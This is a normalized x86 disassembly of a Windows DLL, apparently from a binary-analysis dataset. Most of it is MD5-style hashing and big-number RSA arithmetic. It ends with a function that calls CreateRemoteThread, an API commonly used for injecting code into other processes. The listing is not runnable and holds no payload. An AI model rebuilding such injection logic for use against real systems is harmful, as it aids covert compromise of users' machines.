add ecx eax
mov edi ecx
not edi
mov esi edi
and esi [ ebp - 0x4 ]
mov ebx ecx
and ebx eax
or esi ebx
add esi [ ebp - 0x10 ]
mov ebx ecx
lea edx [ esi + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov [ ebp - 0x8 ] edx
not [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
and esi eax
and edi edx
and ebx edx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
lea esi [ esi + ebx + 0x49b40821 ]
ror esi 0xa
add esi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x44 ]
mov ebx edx
lea eax [ edi + eax - 0x9e1da9e ]
mov edi [ ebp - 0x8 ]
and edi esi
rol eax 0x5
add eax esi
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx ecx
lea esi [ edi + esi - 0x16493856 ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx edx
lea eax [ edi + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x38 ]
lea esi [ edi + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
mov edi ecx
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x24 ]
mov ebx edx
lea eax [ edi + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
and ebx eax
mov edi edx
not edi
and edi esi
or edi ebx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x28 ]
mov ebx ecx
lea esi [ edi + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x14 ]
mov ebx edx
lea eax [ edi + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x676f02d9 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
mov edi ecx
xor edi edx
xor edi esi
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x28 ]
lea ecx [ edi + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov edi ecx
xor edi esi
xor edi eax
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x6d9d6122 ]
rol edx 0x10
add edx ecx
mov edi ecx
xor edi edx
mov ebx edi
xor ebx eax
add ebx [ ebp - 0x10 ]
lea esi [ ebx + esi - 0x21ac7f4 ]
ror esi 0x9
add esi edx
xor edi esi
add edi [ ebp - 0x44 ]
lea eax [ edi + eax - 0x5b4115bc ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x38 ]
lea edi [ edi + ecx + 0x4bdecfa9 ]
rol edi 0xb
add edi eax
mov ecx edi
xor ecx esi
xor ecx eax
add ecx [ ebp - 0x2c ]
mov ebx edi
lea edx [ ecx + edx - 0x944b4a0 ]
rol edx 0x10
add edx edi
xor ebx edx
mov ecx ebx
xor ecx eax
add ecx [ ebp - 0x20 ]
lea ecx [ ecx + esi - 0x41404390 ]
ror ecx 0x9
add ecx edx
xor ebx ecx
add ebx [ ebp - 0x14 ]
mov esi edx
lea eax [ ebx + eax + 0x289b7ec6 ]
xor esi ecx
rol eax 0x4
add eax ecx
xor esi eax
add esi [ ebp - 0x48 ]
lea esi [ esi + edi - 0x155ed806 ]
rol esi 0xb
add esi eax
mov edi esi
xor edi ecx
xor edi eax
add edi [ ebp - 0x3c ]
lea edi [ edi + edx - 0x2b10cf7b ]
rol edi 0x10
add edi esi
mov edx esi
xor edx edi
mov ebx edx
xor ebx eax
add ebx [ ebp - 0x30 ]
lea ecx [ ebx + ecx + 0x4881d05 ]
ror ecx 0x9
add ecx edi
xor edx ecx
add edx [ ebp - 0x24 ]
lea eax [ edx + eax - 0x262b2fc7 ]
mov edx edi
xor edx ecx
rol eax 0x4
add eax ecx
xor edx eax
add edx [ ebp - 0x18 ]
lea edx [ edx + esi - 0x1924661b ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ ebp - 0xc ]
lea esi [ esi + edi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x48 ]
lea eax [ edi + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x10 ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx - 0x36c5fc7 ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x18 ]
lea eax [ edi + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x20 ]
lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x28 ]
lea eax [ edi + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x1d31920 ]
mov edi ecx
rol edx 0xa
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x30 ]
lea esi [ edi + esi - 0x5cfebcec ]
mov edi eax
rol esi 0xf
add esi edx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x14 ]
lea edi [ edi + ecx + 0x4e0811a1 ]
ror edi 0xb
add edi esi
mov ecx edx
not ecx
or ecx edi
xor ecx esi
add ecx [ ebp - 0x38 ]
lea eax [ ecx + eax - 0x8ac817e ]
rol eax 0x6
add eax edi
mov ecx esi
not ecx
or ecx eax
xor ecx edi
add ecx [ ebp - 0x1c ]
lea edx [ ecx + edx - 0x42c50dcb ]
rol edx 0xa
add edx eax
mov ecx edi
not ecx
or ecx edx
xor ecx eax
add ecx [ ebp - 0x40 ]
lea esi [ ecx + esi + 0x2ad7d2bb ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
add ebx eax
not eax
rol esi 0xf
add esi edx
or eax esi
xor eax edx
add eax [ ebp - 0x24 ]
mov [ ecx ] ebx
lea eax [ eax + edi - 0x14792c6f ]
ror eax 0xb
add eax [ ecx + 0x4 ]
add eax esi
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
add eax esi
mov [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
pop edi
add eax edx
pop esi
mov [ ecx + 0xc ] eax
pop ebx
leave
retn
sub_1002110f
test edx edx
jbe r-xdata
retn
push esi
lea esi [ edx - 0x1 ]
shr esi 0x2
inc ecx
add eax 0x2
inc esi
mov dl [ eax - 0x2 ]
mov [ ecx - 0x1 ] dl
mov dl [ eax - 0x1 ]
mov [ ecx ] dl
mov dl [ eax ]
mov [ ecx + 0x1 ] dl
mov dl [ eax + 0x1 ]
mov [ ecx + 0x2 ] dl
add eax 0x4
add ecx 0x4
dec esi
jne r-xdata
pop esi
sub_10021140
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x64 ] eax
mov eax [ ebp + 0x70 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x74 ]
push esi
mov [ ebp - 0x20 ] eax
mov esi ecx
movzx eax [ esi ]
add eax 0x7
cdq
and edx 0x7
add eax edx
push edi
mov edi eax
sar edi 0x3
cmp [ ebp + 0x7c ] edi
jbe r-xdata
push ebx
push [ ebp + 0x7c ]
lea eax [ ebp - 0x1c ]
push [ ebp + 0x78 ]
lea ebx [ ebp - 0x28 ]
push eax
call sub_1002120e
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax 0x406
jmp r-xdata
mov ecx [ ebp + 0x64 ]
pop edi
xor ecx ebp
pop esi
call sub_10027150
add ebp 0x68
leave
retn
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp [ ebp - 0x1c ] al
jne r-xdata
mov eax 0x401
cmp [ ebp - 0x1b ] 0x1
jne r-xdata
push 0x2
pop ecx
lea eax [ edi - 0x1 ]
cmp eax ecx
jbe r-xdata
mov al [ ebp + ecx - 0x1c ]
inc ecx
test al al
jne r-xdata
cmp [ ebp + ecx - 0x1c ] 0xff
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax edi
sub eax ecx
mov [ edx ] eax
lea edx [ eax + 0xb ]
cmp edx edi
ja r-xdata
inc ecx
cmp ecx eax
jb r-xdata
mov esi eax
lea eax [ ebp + ecx - 0x1c ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
sub ecx eax
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
dec esi
jne r-xdata
sub_1002120e
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x214
push edi
push [ ebp + 0x78 ]
lea eax [ ebp - 0x124 ]
push eax
mov eax [ ebp + 0x7c ]
call sub_100212f2
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov edi 0x80
mov eax edi
call sub_100212f2
lea eax [ esi + 0x82 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
mov eax edi
call sub_100212f2
add esp 0x18
push 0x20
pop eax
push 0x20
lea edi [ eax + 0x1 ]
pop eax
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
inc eax
mov [ ebp + 0x68 ] eax
lea eax [ ebp - 0x124 ]
push eax
mov ecx edi
lea edx [ ebp - 0x1c ]
call sub_1002195f
pop ecx
test eax eax
jl r-xdata
mov ecx eax
dec eax
test ecx ecx
jne r-xdata
cmp [ ebp + eax * 4 - 0x1c ] 0x0
jne r-xdata
movzx eax [ esi ]
add eax 0x7
mov ecx [ ebp + 0x68 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ebx ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x1a8 ]
push eax
mov eax edi
call sub_10021846
push edi
lea eax [ ebp - 0x1a8 ]
push eax
push [ ebp + 0x74 ]
mov eax [ ebx ]
call sub_1002133d
add esp 0x1c
xor eax eax
mov eax 0x401
jmp r-xdata
cmp [ ebp + eax * 4 - 0xa0 ] 0x0
jne r-xdata
pop edi
add ebp 0x6c
leave
retn
sub_100212f2
push edi
mov edi [ esp + 0x8 ]
xor edx edx
dec eax
push esi
pop esi
cmp edx 0x21
jae r-xdata
xor esi esi
xor ecx ecx
pop edi
retn
push 0x21
pop ecx
sub ecx edx
lea edi [ edi + edx * 4 ]
xor eax eax
[ edi ]
mov edi [ esp + 0xc ]
mov [ edi + edx * 4 ] esi
inc edx
cmp edx 0x21
jb r-xdata
mov edi [ esp + 0x10 ]
movzx edi [ eax + edi ]
shl edi cl
add ecx 0x8
or esi edi
dec eax
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp ecx 0x20
jae r-xdata
sub_1002133d
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
dec eax
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test eax eax
jl r-xdata
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] 0x0
dec eax
jns r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + edi * 4 ]
xor ecx ecx
inc edi
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov edx esi
shr edx cl
add ecx 0x8
mov [ eax + ebx ] dl
dec eax
test eax eax
jge r-xdata
cmp ecx 0x20
jae r-xdata
sub_1002139b
push edi
mov edi eax
xor eax eax
cmp [ esp + 0xc ] eax
je r-xdata
pop edi
retn
push ebx
mov eax [ edx ]
or ebx 0xffffffff
sub ecx eax
sub ebx eax
cmp ebx ecx
sbb eax eax
neg eax
or ecx ecx
sub ecx [ edx ]
jmp r-xdata
mov ecx [ edi ]
sub ecx eax
add edi 0x4
cmp ecx 0xffffffff
jne r-xdata
pop ebx
mov ebx [ esp + 0xc ]
add [ esp + 0xc ] 0x4
add edx 0x4
dec [ esp + 0x10 ]
mov [ ebx ] ecx
jne r-xdata
sub_100213df
push ebp
mov ebp esp
sub esp 0x128
push ebx
mov ebx eax
lea eax [ edx + edx ]
push edi
mov [ ebp - 0x1c ] eax
push eax
lea eax [ ebp - 0x128 ]
call sub_10021387
add esp 0x4
test edx edx
je r-xdata
xor edi edi
push ebx
mov eax edx
call sub_100219a8
pop ecx
mov edi eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
push [ ebp + 0xc ]
mov eax edx
call sub_100219a8
pop ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
test edx edx
je r-xdata
push [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x128 ]
call sub_10021990
pop ecx
pop edi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
push esi
lea esi [ ebp - 0x128 ]
lea eax [ ebp + eax * 4 - 0x128 ]
sub esi ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] edi
test edi edi
jbe r-xdata
add [ eax ] edi
add [ ebp - 0x4 ] 0x4
add eax 0x4
dec [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ebx ebx
xor edi edi
cmp [ ecx ] ebx
je r-xdata
pop esi
mov eax ecx
add esi eax
add edi [ ebp - 0x20 ]
inc ebx
add esi 0x4
cmp ebx [ ebp - 0x8 ]
jb r-xdata
inc edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_10021a36
add [ esi ] edi
mov eax [ ebp - 0x14 ]
add esp 0x10
cmp [ esi ] edi
sbb edi edi
add [ esi ] eax
neg edi
cmp [ esi ] eax
jae r-xdata
mov eax [ ebp - 0xc ]
mov esi [ ebp - 0x18 ]
sub_100214ce
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
push 0x20
pop esi
mov edi eax
mov ebx ecx
cmp [ ebp + 0x8 ] esi
jae r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub esi [ ebp + 0x8 ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov eax edx
shl eax cl
add edi 0x4
or eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax ecx
mov ecx esi
shr edx cl
add ebx 0x4
neg eax
sbb eax eax
and eax edx
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
jne r-xdata
sub_1002151e
push ebp
lea ebp [ esp - 0x64 ]
sub esp 0x1c4
push esi
mov esi eax
mov eax [ ebp + 0x7c ]
test eax eax
je r-xdata
and [ ebp + 0x5c ] 0x0
push [ ebp + 0x78 ]
call sub_100219a8
pop ecx
mov [ ebp + 0x5c ] eax
jmp r-xdata
pop esi
add ebp 0x64
leave
retn
mov eax [ ebp + 0x78 ]
push edi
mov edi edx
shl edi 0x2
mov eax [ edi + eax - 0x4 ]
mov [ ebp + 0x40 ] edi
xor ecx ecx
mov edx [ ebp + 0x5c ]
test edx edx
je r-xdata
push ebx
push 0x20
pop ebx
sub ebx ecx
push edx
lea eax [ ebp - 0x160 ]
mov [ ebp + 0x44 ] ebx
call sub_10021387
mov eax [ ebp + 0x74 ]
push esi
push ebx
lea ecx [ ebp - 0x160 ]
call sub_100214ce
push [ ebp + 0x5c ]
mov [ ebp + esi * 4 - 0x160 ] eax
mov eax [ ebp + 0x78 ]
push ebx
lea ecx [ ebp - 0x54 ]
call sub_100214ce
mov eax [ ebp + edi - 0x58 ]
mov ecx [ ebp + 0x6c ]
mov [ ebp + 0x60 ] eax
push esi
mov eax ecx
call sub_10021387
mov eax [ ebp + 0x5c ]
add esp 0x18
sub esi eax
mov [ ebp + 0x38 ] esi
js r-xdata
inc ecx
shr eax 0x1
cmp ecx 0x20
jb r-xdata
mov ecx [ ebp + 0x70 ]
push [ ebp + 0x7c ]
mov eax ecx
call sub_10021387
mov eax [ ebp + 0x5c ]
and [ ebp + 0x48 ] 0x0
add esp 0x4
push 0x20
pop esi
mov [ ebp + 0x7c ] eax
cmp ebx esi
jae r-xdata
lea edx [ ebp + esi * 4 - 0x160 ]
add esi eax
lea esi [ ebp + esi * 4 - 0x160 ]
mov [ ebp + 0x3c ] ecx
lea eax [ ebp - 0x160 ]
sub [ ebp + 0x3c ] eax
mov [ ebp + 0x50 ] edx
mov [ ebp + 0x48 ] esi
test eax eax
je r-xdata
pop ebx
pop edi
lea edx [ edi + ecx ]
lea edi [ ebp - 0x160 ]
sub esi ebx
sub edi ecx
jmp r-xdata
inc [ ebp + 0x60 ]
mov ecx [ ebp + 0x60 ]
mov ebx [ esi - 0x4 ]
mov esi [ esi ]
shr ecx 0x10
mov eax 0xffff
cmp cx ax
mov [ ebp + 0x34 ] ecx
mov [ ebp + 0x58 ] esi
mov eax esi
jne r-xdata
mov edi [ esi ]
jmp r-xdata
dec [ ebp + 0x7c ]
sub edx 0x4
mov eax [ edi + edx ]
mov ecx eax
mov [ ebp + 0x40 ] ecx
mov ecx ebx
mov ebx eax
shr ebx cl
mov ecx esi
shl eax cl
or ebx [ ebp + 0x48 ]
mov [ edx ] ebx
mov ebx [ ebp + 0x44 ]
neg ebx
sbb ebx ebx
and ebx eax
cmp [ ebp + 0x7c ] 0x0
mov [ ebp + 0x48 ] ebx
jne r-xdata
movzx ecx cx
inc ecx
xor edx edx
div ecx
movzx eax ax
mov [ ebp + 0x4c ] eax
shr eax 0x10
mov [ ebp + 0x4c ] eax
jmp r-xdata
mov edx [ ebp + 0x50 ]
mov ecx [ ebp + 0x5c ]
push edi
push edx
lea eax [ ebp - 0x54 ]
call sub_100219bc
mov ebx [ ebp + 0x44 ]
shr ecx 0x10
add ecx [ ebp + 0x30 ]
sub [ ebp + 0x58 ] ecx
dec [ ebp + 0x58 ]
movzx edi [ ebp + 0x60 ]
movzx esi [ ebp + 0x34 ]
movzx eax ax
mov ecx edi
imul ecx eax
imul eax esi
mov [ ebp + 0x30 ] eax
mov eax ecx
shl eax 0x10
or edx 0xffffffff
sub ebx eax
sub edx eax
cmp ebx edx
jbe r-xdata
push [ ebp + 0x5c ]
mov eax [ ebp + 0x50 ]
push eax
lea edx [ ebp - 0x54 ]
inc edi
call sub_1002139b
jmp r-xdata
push [ ebp + 0x50 ]
mov ecx [ ebp + 0x5c ]
lea edx [ ebp - 0x54 ]
call sub_1002195f
pop ecx
test eax eax
jl r-xdata
mov eax edi
shl eax 0x10
or ecx 0xffffffff
sub ebx eax
sub ecx eax
cmp ebx ecx
jbe r-xdata
jne r-xdata
sub [ esi ] eax
cmp [ esi ] 0x0
pop ecx
pop ecx
jne r-xdata
mov ecx [ ebp + 0x50 ]
dec [ ebp + 0x38 ]
mov eax [ ebp + 0x3c ]
sub [ ebp + 0x50 ] 0x4
sub esi 0x4
cmp [ ebp + 0x38 ] 0x0
mov [ eax + ecx ] edi
mov [ ebp + 0x48 ] esi
jge r-xdata
sub [ ebp + 0x58 ] esi
inc [ ebp + 0x4c ]
jmp r-xdata
dec [ ebp + 0x58 ]
mov eax 0xffff
cmp [ ebp + 0x34 ] ax
jne r-xdata
mov eax edi
shl eax 0x10
cmp ebx eax
jb r-xdata
cmp [ ebp + 0x60 ] 0xffffffff
jne r-xdata
mov edi [ ebp + 0x40 ]
cmp [ ebp + 0x58 ] esi
ja r-xdata
mov ecx [ ebp + 0x58 ]
mov eax ebx
shl ecx 0x10
shr eax 0x10
add eax ecx
xor edx edx
lea ecx [ esi + 0x1 ]
div ecx
movzx edx ax
movzx edx [ ebp + 0x58 ]
jmp r-xdata
mov ecx eax
shl ecx 0x10
or esi 0xffffffff
sub ebx ecx
sub esi ecx
cmp ebx esi
jbe r-xdata
dec [ ebp + 0x58 ]
movzx eax dx
imul edi eax
imul eax esi
or ecx 0xffffffff
sub ebx edi
sub ecx edi
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp + 0x58 ]
shr eax 0x10
sub ecx eax
dec [ ebp + 0x58 ]
sub ebx [ ebp + 0x60 ]
or eax 0xffffffff
sub eax [ ebp + 0x60 ]
cmp ebx eax
jbe r-xdata
jne r-xdata
inc edx
jmp r-xdata
dec ecx
movzx edi [ ebp + 0x4c ]
mov esi [ ebp + 0x48 ]
mov ebx [ ebp + 0x44 ]
movzx eax dx
shl edi 0x10
add edi eax
dec [ ebp + 0x60 ]
cmp ebx [ ebp + 0x60 ]
jb r-xdata
test ecx ecx
ja r-xdata
sub_100217e4
push ebp
mov ebp esp
sub esp 0x108
push [ ebp + 0x18 ]
lea eax [ ebp - 0x108 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x10 ]
call sub_1002151e
add esp 0x14
leave
retn
sub_1002180d
push ebp
mov ebp esp
sub esp 0x108
push [ ebp + 0x10 ]
lea eax [ ebp - 0x108 ]
push eax
mov eax [ ebp + 0xc ]
mov edx esi
call sub_100213df
push esi
push [ ebp + 0x14 ]
lea eax [ esi + esi ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call sub_100217e4
add esp 0x1c
leave
retn
sub_10021846
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0x218
push esi
mov esi eax
push edi
mov edi ecx
mov ecx [ ebp + 0x74 ]
push esi
lea eax [ ebp - 0x1b0 ]
call sub_10021990
push [ ebp + 0x7c ]
lea eax [ ebp - 0x1b0 ]
push [ ebp + 0x74 ]
push eax
lea eax [ ebp - 0x12c ]
push eax
call sub_1002180d
push [ ebp + 0x7c ]
lea eax [ ebp - 0x12c ]
push [ ebp + 0x74 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
call sub_1002180d
push esi
lea eax [ ebp - 0x24 ]
call sub_10021387
add esp 0x28
mov [ ebp - 0x24 ] 0x1
test edi edi
je r-xdata
dec edi
mov [ ebp + 0x60 ] edi
mov [ ebp + 0x64 ] edi
test edi edi
jl r-xdata
push [ ebp + 0x78 ]
mov eax edi
call sub_100219a8
pop ecx
mov edi eax
mov eax [ ebp + 0x70 ]
push esi
lea ecx [ ebp - 0x24 ]
call sub_10021990
pop ecx
pop edi
pop esi
add ebp 0x68
leave
retn
push ebx
lea ebx [ ecx - 0x1 ]
shr ebx 0x1
inc ebx
mov eax 0xc0000000
test eax edi
jne r-xdata
shl edi 0x2
dec ebx
jne r-xdata
push [ ebp + 0x7c ]
imul eax eax 0x84
lea eax [ ebp + eax - 0x234 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push eax
call sub_1002180d
add esp 0x10
shl edi 0x2
dec ecx
dec ecx
test eax edi
je r-xdata
push [ ebp + 0x7c ]
lea eax [ ebp - 0x24 ]
push eax
push eax
push eax
call sub_1002180d
push [ ebp + 0x7c ]
lea eax [ ebp - 0x24 ]
push eax
push eax
push eax
call sub_1002180d
mov eax edi
shr eax 0x1e
add esp 0x20
test eax eax
je r-xdata
dec [ ebp + 0x64 ]
jns r-xdata
test ecx ecx
jbe r-xdata
mov ecx [ ebp + 0x78 ]
mov eax [ ebp + 0x64 ]
mov edi [ ecx + eax * 4 ]
push 0x20
pop ecx
cmp eax [ ebp + 0x60 ]
jne r-xdata
pop ebx
sub_1002195f
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
lea eax [ edx + ecx * 4 ]
sub edi edx
xor eax eax
inc eax
jmp r-xdata
jb r-xdata
pop edi
pop esi
retn
or eax 0xffffffff
jmp r-xdata
test ecx ecx
jne r-xdata
sub eax 0x4
mov edx [ edi + eax ]
mov esi [ eax ]
dec ecx
cmp edx esi
ja r-xdata
sub_100219bc
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0xc ] ebx
je r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn
cmp ecx ebx
jbe r-xdata
sub eax edx
mov [ ebp - 0x4 ] edx
sub [ ebp - 0x4 ] esi
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ ecx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
push [ edi + eax ]
push [ ebp + 0xc ]
call sub_10021a36
mov edi [ edi ]
or eax 0xffffffff
sub edi ebx
sub eax ebx
add esp 0x10
cmp eax edi
mov eax [ ebp - 0x10 ]
sbb ebx ebx
mov [ esi ] edi
sub [ esi ] eax
mov ecx [ esi ]
or edx 0xffffffff
sub edx eax
neg ebx
cmp ecx edx
jbe r-xdata
add ebx [ ebp - 0x14 ]
add esi 0x4
dec [ ebp - 0x8 ]
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
pop edi
sub_10021a36
push ebp
mov ebp esp
push ecx
movzx edx [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
shr esi 0x10
shr edi 0x10
movzx esi si
movzx edi di
mov ecx edx
imul edx edi
imul ecx eax
mov [ ebp + 0xc ] esi
imul esi edi
imul eax [ ebp + 0xc ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x10 ]
add eax edx
mov [ ebx ] esi
cmp eax edx
jae r-xdata
mov edi [ ebp + 0x14 ]
mov edx eax
shl edx 0x10
add ecx edx
shr eax 0x10
mov [ edi ] ecx
cmp ecx edx
jae r-xdata
mov [ ebp - 0x4 ] 0x10000
add esi eax
add esi [ ebp - 0x4 ]
pop edi
mov [ ebx ] esi
pop esi
pop ebx
leave
retn
inc [ ebp - 0x4 ]
sub_10021aa6
push 0x30
mov eax sub_10050bd7
call sub_1002b2a6
lea eax [ ebp - 0x14 ]
push eax
xor esi esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push esi
push [ ebp + 0x8 ]
call [ CreateRemoteThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_10001ebc
mov [ ebp - 0x4 ] esi
cmp [ ebp - 0x18 ] esi
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_100020e2
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_100148e3
mov [ edi ] r--data
mov eax edi
call sub_1002b37e
